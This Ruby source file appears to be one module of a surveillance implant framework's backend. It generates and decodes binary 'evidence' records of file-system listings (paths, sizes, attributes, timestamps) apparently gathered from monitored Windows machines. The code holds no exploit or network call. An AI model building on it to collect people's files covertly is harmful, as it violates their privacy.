require 'rcs-common/evidence/common'

module RCS

module FilesystemEvidence

  FILESYSTEM_VERSION = 2010031501
  FILESYSTEM_IS_FILE = 0
	FILESYSTEM_IS_DIRECTORY = 1
	FILESYSTEM_IS_EMPTY     = 2

  def content
    path = ["C:\\miao", "C:\\miao\\bau", "C:\\pippo\\pluto\\paperino"].sample
    path = path.to_utf16le_binary_null
    content = StringIO.new
    content.write [FILESYSTEM_VERSION, path.bytesize, FILESYSTEM_IS_FILE, 0, 0].pack("I*")
    content.write Time.now.getutc.to_filetime.pack('L*')
    content.write path

    content.string
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?

      info = Hash[common_info]

      version, path_len, attribute, size_lo, size_hi = stream.read(20).unpack("L*")
      raise EvidenceDeserializeError.new("invalid log version for FILESYSTEM [#{version} != #{FILESYSTEM_VERSION}]") unless version == FILESYSTEM_VERSION

      info[:data] ||= Hash.new
      trace :debug, "FILESYSTEM size_hi #{size_hi} size_lo #{size_lo}"
      info[:data][:size] = Float((size_hi << 32) | size_lo)
      info[:data][:attr] = attribute
      low_time, high_time = *stream.read(8).unpack('L*')
      info[:da] = Time.from_filetime(high_time, low_time)

      path = stream.read(path_len).terminate_utf16le
      next if path.nil?
      
      info[:data][:path] = path.utf16le_to_utf8 #gsub
      
      # this is not the real clone! redefined clone ...
      yield info if block_given?
    end
    :delete_raw
  end
end

end # ::RCS